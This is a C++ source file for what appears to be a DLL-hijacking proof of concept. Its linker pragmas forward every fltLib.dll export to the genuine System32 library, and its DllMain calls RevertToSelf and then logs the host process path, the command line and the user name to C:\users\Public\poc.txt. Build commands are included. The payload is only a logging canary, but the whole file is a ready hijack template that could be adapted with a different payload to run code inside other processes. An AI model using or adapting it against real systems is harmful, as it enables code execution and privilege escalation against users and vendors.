// c:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat
// cl.exe /D_USRDLL /D_WINDLL /MT /Tc raw.cpp /link /DLL /out:raw.dll /SUBSYSTEM:WINDOWS /MACHINE:x64
#pragma comment(linker, "/export:FilterAttach=C:\\Windows\\System32\\fltLib.FilterAttach,@1")
#pragma comment(linker, "/export:FilterAttachAtAltitude=C:\\Windows\\System32\\fltLib.FilterAttachAtAltitude,@2")
#pragma comment(linker, "/export:FilterClose=C:\\Windows\\System32\\fltLib.FilterClose,@3")
#pragma comment(linker, "/export:FilterConnectCommunicationPort=C:\\Windows\\System32\\fltLib.FilterConnectCommunicationPort,@4")
#pragma comment(linker, "/export:FilterCreate=C:\\Windows\\System32\\fltLib.FilterCreate,@5")
#pragma comment(linker, "/export:FilterDetach=C:\\Windows\\System32\\fltLib.FilterDetach,@6")
#pragma comment(linker, "/export:FilterFindClose=C:\\Windows\\System32\\fltLib.FilterFindClose,@7")
#pragma comment(linker, "/export:FilterFindFirst=C:\\Windows\\System32\\fltLib.FilterFindFirst,@8")
#pragma comment(linker, "/export:FilterFindNext=C:\\Windows\\System32\\fltLib.FilterFindNext,@9")
#pragma comment(linker, "/export:FilterGetDosName=C:\\Windows\\System32\\fltLib.FilterGetDosName,@10")
#pragma comment(linker, "/export:FilterGetInformation=C:\\Windows\\System32\\fltLib.FilterGetInformation,@11")
#pragma comment(linker, "/export:FilterGetMessage=C:\\Windows\\System32\\fltLib.FilterGetMessage,@12")
#pragma comment(linker, "/export:FilterInstanceClose=C:\\Windows\\System32\\fltLib.FilterInstanceClose,@13")
#pragma comment(linker, "/export:FilterInstanceCreate=C:\\Windows\\System32\\fltLib.FilterInstanceCreate,@14")
#pragma comment(linker, "/export:FilterInstanceFindClose=C:\\Windows\\System32\\fltLib.FilterInstanceFindClose,@15")
#pragma comment(linker, "/export:FilterInstanceFindFirst=C:\\Windows\\System32\\fltLib.FilterInstanceFindFirst,@16")
#pragma comment(linker, "/export:FilterInstanceFindNext=C:\\Windows\\System32\\fltLib.FilterInstanceFindNext,@17")
#pragma comment(linker, "/export:FilterInstanceGetInformation=C:\\Windows\\System32\\fltLib.FilterInstanceGetInformation,@18")
#pragma comment(linker, "/export:FilterLoad=fltLib.FilterLoad,@19")
#pragma comment(linker, "/export:FilterReplyMessage=C:\\Windows\\System32\\fltLib.FilterReplyMessage,@20")
#pragma comment(linker, "/export:FilterSendMessage=C:\\Windows\\System32\\fltLib.FilterSendMessage,@21")
#pragma comment(linker, "/export:FilterUnload=C:\\Windows\\System32\\fltLib.FilterUnload,@22")
#pragma comment(linker, "/export:FilterVolumeClose=C:\\Windows\\System32\\fltLib.FilterVolumeClose,@23")
#pragma comment(linker, "/export:FilterVolumeFindClose=C:\\Windows\\System32\\fltLib.FilterVolumeFindClose,@24")
#pragma comment(linker, "/export:FilterVolumeFindFirst=C:\\Windows\\System32\\fltLib.FilterVolumeFindFirst,@25")
#pragma comment(linker, "/export:FilterVolumeFindNext=C:\\Windows\\System32\\fltLib.FilterVolumeFindNext,@26")
#pragma comment(linker, "/export:FilterVolumeInstanceFindClose=C:\\Windows\\System32\\fltLib.FilterVolumeInstanceFindClose,@27")
#pragma comment(linker, "/export:FilterVolumeInstanceFindFirst=C:\\Windows\\System32\\fltLib.FilterVolumeInstanceFindFirst,@28")
#pragma comment(linker, "/export:FilterVolumeInstanceFindNext=C:\\Windows\\System32\\fltLib.FilterVolumeInstanceFindNext,@29")
// This time we do need a proper proxy DLL, hence pragmas above. We are proxying fltLib.dll.

#include <windows.h>
#pragma comment(lib,"user32.lib")
#pragma comment(lib,"kernel32.lib")
#pragma comment(lib,"advapi32.lib")

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		RevertToSelf(); // if possible, revert the impersonation of the current thread
		char user_name[104];
		memcpy(user_name, "", 104);
		char module_fname[MAX_PATH];
		memcpy(module_fname, "", MAX_PATH);
		LPSTR command_line = GetCommandLineA();
		GetModuleFileNameA(NULL, module_fname, MAX_PATH);
		HANDLE hFile = CreateFileA("C:\\users\\Public\\poc.txt", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		DWORD max_user_name = 104;
		GetUserNameA(user_name, &max_user_name);

		DWORD bytesWritten; char lf[] = "\n"; char left_bracket[] = " [ "; char right_bracket[] = " ] ";
		if (hFile != INVALID_HANDLE_VALUE)
		{
			SetFilePointer(hFile, 0, NULL, FILE_END);
			WriteFile(hFile, module_fname, strlen(module_fname), &bytesWritten, NULL);
			WriteFile(hFile, left_bracket, strlen(left_bracket), &bytesWritten, NULL);
			WriteFile(hFile, command_line, strlen(command_line), &bytesWritten, NULL);
			WriteFile(hFile, right_bracket, strlen(left_bracket), &bytesWritten, NULL);
			WriteFile(hFile, left_bracket, strlen(left_bracket), &bytesWritten, NULL);
			WriteFile(hFile, user_name, strlen(user_name), &bytesWritten, NULL);
			WriteFile(hFile, right_bracket, strlen(left_bracket), &bytesWritten, NULL);
			WriteFile(hFile, lf, 1, &bytesWritten, NULL);
			CloseHandle(hFile);
		}
	}
	return TRUE;
}

